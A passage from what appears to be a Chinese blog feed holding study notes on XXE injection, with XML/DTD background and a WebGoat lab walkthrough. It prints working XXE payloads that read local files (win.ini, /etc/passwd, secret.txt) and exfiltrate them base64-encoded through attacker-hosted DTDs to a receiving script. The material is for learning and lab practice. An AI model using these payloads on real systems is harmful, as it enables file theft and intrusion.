]&gt; </code>。SYSTEM外部引用实体会定位到指定地址来引用</p><p>3.通过simplexml_load_import()获取 DOM 文档节点并转换为 SimpleXML 节点</p><p>4.通过echo函数输出节点内容，根据file协议输出了攻击者想要看到的文件</p><h5 id="读取含有特殊字符的文件"><a href="#读取含有特殊字符的文件" class="headerlink" title="读取含有特殊字符的文件"></a>读取含有特殊字符的文件</h5><p>刚才读取的文件中没有任何的特殊符号。如果我们读取的文件中含有特殊符号<code>&lt; &gt;</code>等的话，如PHP文件，就会报错。</p><p>例E:/x.txt文件内容：<code>&lt;hello world</code>，带有特殊符号<code>&lt;</code></p><p>读取结果：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220405144253.png"></p><ul><li><p>方案一：先编码再读，常用思路</p><p>file:////E:/x.txt换为 php://filter/read=convert.base64-encode/resource=E:/x.txt</p><p><em>利用PHP伪协议filter，这在我文件包含相关内容的博客中有介绍。</em></p><p>结果：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220407231147.png"></p></li><li><p>方案二：利用CDTAT将我们的数据包起来</p><blockquote><p>CDATA 的意思是字符数据（character data）。</p><p><strong>CDATA 是不会被解析器解析的文本。</strong>在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><p>如：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">&gt;&lt;![CDATA[<br>&gt;xxxx<br>&gt;]]&gt;<br></code></pre></div></td></tr></table></figure></blockquote><p>需要在dtd实体中拼接，根据其特点利用了参数实体。payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; <br>&lt;!DOCTYPE roottag [<br>&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   <br>&lt;!ENTITY % goodies SYSTEM &quot;file:///e:/x.txt&quot;&gt;  <br>&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  <br>&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1/evil.dtd&quot;&gt; <br>%dtd; ]&gt; <br><br>&lt;roottag&gt;&amp;all;&lt;/roottag&gt;<br></code></pre></div></td></tr></table></figure><p>127.0.0.1/evil.dtd：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; <br>&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;<br></code></pre></div></td></tr></table></figure><p>payload作用过程：<br>1.我们上传的XML中的dtd部分，其先声明了一些参数实体，在开始阶段就看成3个独立的参数实体，另一个参数实体调用了攻击者上布置的一个dtd文件。</p><p>2.而这个被调用的dtd只是一个普通的通用实体，但作用是将另外三个参数实体拼接成在了一起</p><p>3.然后XML文档形成时：加载外部dtd文件，准备解析成XML文档–&gt;调用通用实体–&gt;通用实体解析后又调用了三个参数实体–&gt;参数实体解析。拼接完成。</p><p>结果：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220405155417.png"></p></li></ul><h4 id="无回显xxe注入"><a href="#无回显xxe注入" class="headerlink" title="无回显xxe注入"></a>无回显xxe注入</h4><h5 id="xxe盲注"><a href="#xxe盲注" class="headerlink" title="xxe盲注"></a>xxe盲注</h5><p>在实际情况中，服务器接收的xml数据是不会输出的，就是说php语句中不会<code>echo $xml;</code>服务器端a.php:</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    libxml_disable_entity_loader (<span class="hljs-literal">false</span>);<br>    <span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>因此我们想要现实中利用这个漏洞就需要找到一种回显的方法。</p><p>我们上传的payload仍然只是一个XML格式的文档。但因为没有回显，所以我们上传的XML要完成两个任务，一个是读取目标文件内容，一个将读取到的文件发给我们攻击者的机器。根据DTD外部实体的作用<strong>引用指定url/uri</strong>，所以理论上通过外部实体是可以达成攻击的。</p><p><em>(实际环境下127.0.0.1换成攻击者的公网ip)</em></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!DOCTYPE convert [ <br>&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/a.dtd&quot;&gt;<br>%remote;%int;%send;<br>]&gt;<br></code></pre></div></td></tr></table></figure><p>xml.dtd:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///E:/x.txt&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://127.0.0.1/recive.php?a=%file;&#x27;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure><p><strong>注意</strong>，一般情况下只能用file协议指定路径，如</p><p><code>file SYSTEM file:///E:/x.txt</code></p><p>如果接收xml数据的代码为<code>file_get_contents(&#39;php://input&#39;)</code>时才可以加php伪协议，如</p><p><code>file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///E:/x.txt</code></p><p>参数实体内的%不会生效，所以用&amp;#37代替（&amp;#37的url解码为%）</p><p>在攻击者服务器上，有着一个接收数据的php文件</p><p>recive.php</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;<span class="hljs-subst">$a</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p><em>我看的大佬们都是用的端口监听，我试下就在windows环境中复现（绝对不是因为我弄不来监听服务😕）</em></p><p>payload作用过程：</p><ul><li><p>payload中定义了参数实体<code>% remote</code>，并调用该实体<code>%remote;</code>，使得xml解析器解析时引用攻击者Web服务器上的dtd文件，接着调用参数实体<code>%int;</code>和<code>%send;</code>。</p></li><li><p>在被引用的dtd文件中，有着payload所调用的参数实体的定义，即<code>% int</code>。然后<code>%int；</code>被解析的时候又生成了另一个参数实体的定义，即<code>% send</code>，同样在payload中以<code>%send</code>的形式被调用。</p><p><em>这一步构造参数实体<code>% int</code>来引入另一个实体<code>send</code>是必须的（此处也可以引入另一个参数实体,，需要更改payload和dtd结构），这是根据xml文档解析规则来写的</em></p></li><li><p>当xml解析器解析通用实体<code>%send</code>时，该实体将参数实体<code>% file</code>获取到的编码后的文件内容发送给攻击者。</p></li></ul><p>从逻辑上来说，我们没必要从攻击者的服务器上调用dtd文件，直接在payload中写好读取文件和发送文件就行了，就像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ENTITY % filecontents SYSTEM &#x27;file:///etc/passwd&gt;<br>&lt;!ENTITY test SYSTEM &#x27;http://yourserver/%filecontents;&#x27;&gt;]&gt;<br>&lt;root&gt;&amp;test;&lt;/root&gt;<br></code></pre></div></td></tr></table></figure><p>这样解析后的结果为<code>http://yourserver/%filecontents</code>，参数实体不会解析</p><p>这是因为根据xml文档规定，参数实体不能在DTD子集内调用，但可以在外部子集中调用，即我们payload中的形式。</p><p>实验步骤：</p><p>注意一下要用到的三个文件，靶场a.php，引用的a.dtd，接收数据的recive.php：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411182244.png"></p><p>上传xml数据，抓包，填上payload，发送</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411182446.png"></p><p>我们再来查看apache的log文件</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411182558.png"></p><p>成功接收到一个经过base64编码的请求，解码验证一下</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411182658.png"></p><p>成功读取到目标主机上的文件</p><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>其实和盲注一样，只是最后发送信息时发送到一个不存在的地方即可，我们还是先再来做一次盲注吧😉后面我会附上上报错注入的效果的</p><p>这次我们试着在WebGoat靶场上实现</p><p>以WebGoat A4 xxe部分为例，关卡告诉我们要读取的文件路径为<code>/home/webgoat/.webgoat-8.1.0//XXE/secret.txt</code></p><p>靶场告诉了我们需要读取文件的路径</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411183519.png"></p><p>在这个评论区处我们上传评论并抓包</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220409201013.png"></p><p>发现数据以xml格式提交，先在攻击机上准备好被引用的dtd文件</p><p>a.dtd：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:///home/webgoat/.webgoat-8.1.0//XXE/secret.txt&quot;&gt;<br>&lt;!ENTITY % print &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://192.168.189.1/recive.php?a=%file;&#x27;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure><p><em>报错注入的话就是把dtd文件里发送的地址乱填</em></p><p>设置payload并发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.189.1/a.dtd&quot;&gt;<br>%dtd;<br>%print;<br>%send;<br>]&gt;<br>&lt;comment&gt;  &lt;text&gt;aaa&lt;/text&gt;&lt;/comment&gt;<br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411191258.png"></p><p>同样再查看一下log文件</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411191337.png"></p><p>成功读取到目标数据</p><p>而报错注入的话，会在返回页面的报错信息中获取到文件内容</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411192604.png"></p><h4 id="dos攻击"><a href="#dos攻击" class="headerlink" title="dos攻击"></a>dos攻击</h4><p>这个比较简单，我就直接复制WebGoat靶场的图了</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220412213503.png"></p><h4 id="内网相关（留坑）"><a href="#内网相关（留坑）" class="headerlink" title="内网相关（留坑）"></a>内网相关（留坑）</h4><p>从盲注的步骤中可以注意到，我们可以使服务器主动发起连接请求。那么我们也可以使服务器访问内网主机，这也是ssrf的形式。</p><blockquote><p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p><p>….</p></blockquote><p><em>我看大佬还写了很多XXE有关的内容，不是很好搞懂和上手。我计划以后找时间复现一下再写个xxe进阶。必不可能咕😉</em></p><hr><p>参考：</p><p><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)</a></p><p><a href="https://lalajun.github.io/2019/12/03/WEB-XXE/">WEB-XXE (lalajun.github.io)</a></p><p><a href="https://blog.csdn.net/elephantxiang/article/details/114680896"> WebGoat (A4) XML External Entities (XXE)_仙女象的博客-CSDN博客</a></p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE学习笔记</title>
    <link href="/2022/04/04/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/04/04/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>XXE注入简单介绍：XXE就是在可以解析XML的地方（比如一个输入框处等），在这种地方提交XML的恶意代码来执行。该漏洞一般可以做到内网文件读取，端口扫描，内网程序攻击，任意命令执行等。</p><span id="more"></span><p>XXE全称XML External Entity Injection，也就是XML外部实体注入攻击，是对非安全的外部实体数据进行处理时引发的安全问题。在学习XXE漏洞之前，需先了解XML语法规则，DTD以及外部实体的定义及调用形式。</p><hr><h2 id="XML与DTD"><a href="#XML与DTD" class="headerlink" title="XML与DTD"></a>XML与DTD</h2><p>XML(Extensible Markup Language)，中文名可扩展标记语言。用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p>XML最初设计的目的是弥补HTML的不足，后来逐渐用于网络数据的转换和描述。XML的设计宗旨是传输数据而非显示数据。</p><p><strong>这部分比较简单，只是写的比较多，看完有个印象就行</strong></p><p><strong>重点在DTD外部实体部分和xxe的实现</strong></p><p><strong>重点在DTD外部实体部分和xxe的实现</strong></p><p><strong>重点在DTD外部实体部分和xxe的实现</strong></p><h3 id="XML语法规则"><a href="#XML语法规则" class="headerlink" title="XML语法规则"></a>XML语法规则</h3><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><ul><li><p>根元素</p><p>XML 必须包含根元素，它是所有其他元素的父元素，比如以下实例中 root 就是根元素</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml-dtd">&lt;root&gt;<br>  &lt;child&gt;<br>    &lt;subchild&gt;.....&lt;/subchild&gt;<br>  &lt;/child&gt;<br>&lt;/root&gt;<br></code></pre></div></td></tr></table></figure></li><li><p>声明</p><p>声明文件的可选部分，如果存在需要放在文档的第一行，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br></code></pre></div></td></tr></table></figure></li></ul><ul><li><p>元素</p><p>XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。</p><ul><li>所有的XML元素必须有一个关闭标签</li><li>XML标签对大小写敏感</li><li>XML必须正确嵌套</li></ul></li></ul><ul><li><p>属性</p><p>与 HTML 类似，XML 元素也可拥有属性（名称/值的对）。XML属性值必须加引号,一个元素可以有多个属性。</p><p>元素和属性的实例如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml-dtd">&lt;note date=&quot;12/11/2007&quot;&gt;<br>&lt;to&gt;Tove&lt;/to&gt;<br>&lt;from&gt;Jani&lt;/from&gt;<br>&lt;/note&gt;<br></code></pre></div></td></tr></table></figure></li></ul><p><strong>关于XML语法接下来的部分是关系到DTD，在了解了DTD之后更容易理解</strong></p><ul><li><p>实体</p><p>实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用。关于实体应用的部分在接下来的DTD部分中将会讲到。</p><p>另外在 XML 中，一些字符拥有特殊的意义。如果您把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p><p>这样会产生 XML 错误：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>if salary &lt; 1000 then<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>为了避免这个错误，请用<strong>实体引用</strong>来代替 “&lt;” 字符：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>if salary <span class="hljs-symbol">&amp;lt;</span> 1000 then<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>在 XML 中，有 5 个预定义的实体引用：</p><table><thead><tr><th>&amp;lt;</th><th>&lt;</th><th>less than</th></tr></thead><tbody><tr><td>&amp;gt;</td><td>&gt;</td><td>greater than</td></tr><tr><td>&amp;amp;</td><td>&amp;</td><td>ampersand</td></tr><tr><td>&amp;apos;</td><td>‘</td><td>apostrophe</td></tr><tr><td>&amp;quot;</td><td>“</td><td>quotation mark</td></tr></tbody></table><p><strong>注释：</strong>在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p></li><li><p>PCDATA</p><p>PCDATA 的意思是被解析的字符数据（parsed character data）。</p><p>可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。</p><p><strong>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</strong></p><p>文本中的标签会被当作标记来处理，而实体会被展开。</p><p>不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</p></li></ul><ul><li><p>CDATA</p><p>CDATA 的意思是字符数据（character data）。</p><p><strong>CDATA 是不会被解析器解析的文本。</strong>在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p></li></ul><p>PACDATA和CDATA会写在XML文档中的DTD部分，接下来就介绍XML中的DTD。</p><h3 id="DTD介绍"><a href="#DTD介绍" class="headerlink" title="DTD介绍"></a>DTD介绍</h3><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p><p>一个DTD文档包含： </p><p>元素的定义规则；元素之间的关系规则；属性的定义规则。</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用</p><h4 id="内部DTD"><a href="#内部DTD" class="headerlink" title="内部DTD"></a>内部DTD</h4><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs DTD">&lt;!DOCTYPE 根元素 [元素声明]&gt; <br></code></pre></div></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE note [<br>&lt;!ELEMENT note (to,from,heading,body)&gt;<br>&lt;!ELEMENT to (#PCDATA)&gt;<br>&lt;!ELEMENT from (#PCDATA)&gt;<br>&lt;!ELEMENT heading (#PCDATA)&gt;<br>&lt;!ELEMENT body (#PCDATA)&gt;<br>]&gt;<br></code></pre></div></td></tr></table></figure><p>以上 DTD 解释如下：</p><ul><li><p><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <strong>note</strong> 类型的文档。</p></li><li><p><strong>!ELEMENT note</strong> (第三行)定义 <strong>note</strong> 元素有四个元素：”to、from、heading,、body”</p></li><li><p><strong>!ELEMENT to</strong> (第四行)定义 <strong>to</strong> 元素为 “#PCDATA” 类型</p></li><li><p><strong>!ELEMENT from</strong> (第五行)定义 <strong>from</strong> 元素为 “#PCDATA” 类型</p></li><li><p><strong>!ELEMENT heading</strong> (第六行)定义 <strong>heading</strong> 元素为 “#PCDATA” 类型</p></li><li><p><strong>!ELEMENT body</strong> (第七行)定义 <strong>body</strong> 元素为 “#PCDATA” 类型</p></li></ul><p>所以根据这段DTD，完整的XML文档应该这么写：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE note [<br>&lt;!ELEMENT note (to,from,heading,body)&gt;<br>&lt;!ELEMENT to (#PCDATA)&gt;<br>&lt;!ELEMENT from (#PCDATA)&gt;<br>&lt;!ELEMENT heading (#PCDATA)&gt;<br>&lt;!ELEMENT body (#PCDATA)&gt;<br>]&gt;<br>&lt;note&gt;<br>&lt;to&gt;Tove&lt;/to&gt;<br>&lt;from&gt;Jani&lt;/from&gt;<br>&lt;heading&gt;Reminder&lt;/heading&gt;<br>&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;<br>&lt;/note&gt; <br></code></pre></div></td></tr></table></figure><h4 id="外部DTD"><a href="#外部DTD" class="headerlink" title="外部DTD"></a>外部DTD</h4><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt; <br></code></pre></div></td></tr></table></figure><p>下面这个XML文档和上面的XML文档相同，但是却用的一个外部的DTD</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;<br>&lt;note&gt;<br>  &lt;to&gt;Tove&lt;/to&gt;<br>  &lt;from&gt;Jani&lt;/from&gt;<br>  &lt;heading&gt;Reminder&lt;/heading&gt;<br>  &lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;<br>&lt;/note&gt; <br></code></pre></div></td></tr></table></figure><p>这是包含 DTD 的 “note.dtd” 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;<br>&lt;!ELEMENT to (#PCDATA)&gt;<br>&lt;!ELEMENT from (#PCDATA)&gt;<br>&lt;!ELEMENT heading (#PCDATA)&gt;<br>&lt;!ELEMENT body (#PCDATA)&gt;<br></code></pre></div></td></tr></table></figure><h4 id="DTD实体介绍"><a href="#DTD实体介绍" class="headerlink" title="DTD实体介绍"></a>DTD实体介绍</h4><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><ul><li>实体引用是对实体的引用。</li><li>实体可在内部或外部进行声明。</li></ul><p><strong>通过对几种实体的理解，我们能在不同情况下更好地绕过限制实现xxe漏洞。</strong></p><p><strong>此处是重点，建议结合实践之后再来理解，更容易搞懂</strong></p><h5 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h5><p><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml-dtd">DTD 实例：<br>&lt;!ENTITY name &quot;Eggs&quot;&gt;<br>&lt;!ENTITY describe &quot;handsome boy&quot;&gt;<br><br>XML 实例：<br>&lt;author&gt;&amp;name;&amp;describe;&lt;/author&gt; <br></code></pre></div></td></tr></table></figure><h5 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h5><p><code> &lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml-dtd">DTD 实例:<br>&lt;!ENTITY name SYSTEM &quot;http://www.eggswoo.com/eggs.dtd&quot;&gt;<br>&lt;!ENTITY describe SYSTEM &quot;http://www.eggswoo.com/eggs.dtd&quot;&gt;<br><br>XML 实例:<br>&lt;author&gt;&amp;name;&amp;describe;&lt;/author&gt; <br></code></pre></div></td></tr></table></figure><p>除了将实体分为内部和外部外，实体也可以分为通用实体和参数实体</p><h5 id="通用实体"><a href="#通用实体" class="headerlink" title="通用实体"></a>通用实体</h5><p>用<code> &amp;实体名;</code> 引用的实体，在DTD 中定义，在 XML 文档中引用</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; <br>&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; <br>&lt;updateProfile&gt;  <br>    &lt;firstname&gt;Joe&lt;/firstname&gt;  <br>    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  <br>    ... <br>&lt;/updateProfile&gt;<br></code></pre></div></td></tr></table></figure><h5 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h5><ul><li>使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中引用</strong></li><li>只有在 DTD 文件中，参数实体的声明才能引用其他实体</li><li>和通用实体一样，参数实体也可以外部引用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml-dtd">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; <br>&lt;!ENTITY % remote-dtd 